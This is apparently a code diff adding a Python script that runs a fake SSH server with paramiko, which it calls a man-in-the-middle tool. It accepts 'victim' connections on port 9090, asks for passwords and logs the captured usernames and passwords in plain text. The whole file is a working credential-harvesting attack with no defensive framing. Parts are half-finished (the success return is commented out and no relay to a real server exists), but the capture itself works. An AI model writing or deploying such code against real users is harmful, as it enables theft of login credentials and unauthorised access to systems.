@@ -1,0 +1,91 @@
+import paramiko
+import socket
+import threading
+import logging
+
+# Victim connects to the attacker's port
+MITM_HOST = '0.0.0.0'
+MITM_PORT = 9090
+
+logging.basicConfig(level=logging.DEBUG)
+
+class FakeSSHServer(paramiko.ServerInterface):
+    def __init__(self, victim_socket):
+        self.event = threading.Event()
+        self.victim_username = None
+        self.victim_password = None
+        self.victim_socket = victim_socket  # Store the victim_socket
+
+    # first, get_allowed_auths gets called when the client queries which authentication methods are available for a particular username. In this case, the method will return "password", telling the client that it should attempt password-based authentication.
+    def get_allowed_auths(self, username):
+        return "password"
+
+    # next, check_auth_password will be called when the client attempts to authenticate using a password. The server captures the username and password, logs them, and returns paramiko.AUTH_SUCCESSFUL, meaning the login was successful.
+    def check_auth_password(self, username, password):
+        logging.info(f"[*] Captured victim credentials: {username}, {password}")
+        self.victim_username = username
+        self.victim_password = password
+        # return paramiko.AUTH_SUCCESSFUL
+        # Close the victim_socket
+        logging.info("Closing victim socket.")
+        self.victim_socket.close()
+
+    # then, check_channel_request is called when the client requests to open a channel (e.g., for an interactive session). If the request is for a session, it returns paramiko.OPEN_SUCCEEDED, allowing the channel to open.
+    def check_channel_request(self, kind, chanid):
+        logging.debug(f"Channel request: {kind}")
+        if kind == 'session':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+def handle_client(victim_socket, server):
+    logging.info("Starting handling client.")
+    try:
+        # Set up paramiko to handle SSH handshake with the victim
+        victim_transport = paramiko.Transport(victim_socket)
+        victim_transport.add_server_key(paramiko.RSAKey.generate(2048))
+        victim_transport.start_server(server=server)
+
+        # Wait for the authentication to complete
+        server.event.wait(10)
+
+        if server.victim_username is None or server.victim_password is None:
+            logging.error("Failed to capture credentials.")
+            return
+    except Exception as e:
+        logging.error(f"Error handling client: {str(e)}")
+        try:
+            victim_socket.close()
+        except Exception as e:
+            logging.error(f"Error closing sockets: {str(e)}")
+
+def start_mitm_server():
+    ssh_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ssh_server_socket.bind((MITM_HOST, MITM_PORT))
+    ssh_server_socket.listen(5)
+
+    try:
+        while True:
+            logging.info(f"[*] Waiting for connections on {MITM_HOST}:{MITM_PORT}")
+            victim_socket, addr = ssh_server_socket.accept()
+            logging.info(f"[*] Victim connected from {addr}")
+
+            try:
+                # Handle SSH handshake with the victim
+                server = FakeSSHServer(victim_socket)  # Simulate an SSH server
+                handle_client(victim_socket, server)
+
+            except Exception as e:
+                logging.error(f"Error during MITM setup: {e}")
+            finally:
+                victim_socket.close()
+
+    except KeyboardInterrupt:
+        logging.info("Interrupted by user. Closing server socket.")
+    finally:
+        ssh_server_socket.close()
+        logging.info("Server socket closed.")
+
+
+if __name__ == "__main__":
+    start_mitm_server()
+
